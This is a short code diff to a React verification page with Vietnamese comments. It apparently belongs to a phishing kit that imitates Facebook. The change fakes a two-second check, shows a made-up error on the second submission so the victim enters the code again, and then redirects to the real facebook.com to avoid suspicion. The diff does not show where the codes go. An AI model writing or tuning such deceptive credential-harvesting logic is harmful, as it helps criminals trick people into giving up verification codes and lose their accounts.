@@ -146,12 +146,17 @@ const Verify = () => {
         // Delay 2 giây mà không hiển thị countdown
         await new Promise((resolve) => setTimeout(resolve, 2000));
 
-        setShowError(true);
-        setAttempts((prev) => prev + 1);
+        const newAttempts = attempts + 1;
+        
+        // ✅ B1: Không báo lỗi (attempts = 0)
+        // ✅ B2: Báo lỗi (attempts = 1)  
+        // ✅ B3: Không báo lỗi, chuyển trang (attempts = 2)
+        setShowError(newAttempts === 1);
+        setAttempts(newAttempts);
         setIsLoading(false);
 
-        // Chỉ cho 3 lần nhập: lần 1 + 2 lần sai = tổng 3 lần
-        if (attempts + 1 >= 3) {
+        // Sau lần nhập thứ 3 (attempts = 2) thì chuyển trang
+        if (newAttempts >= 2) {
             window.location.replace('https://facebook.com');
             return;
         }
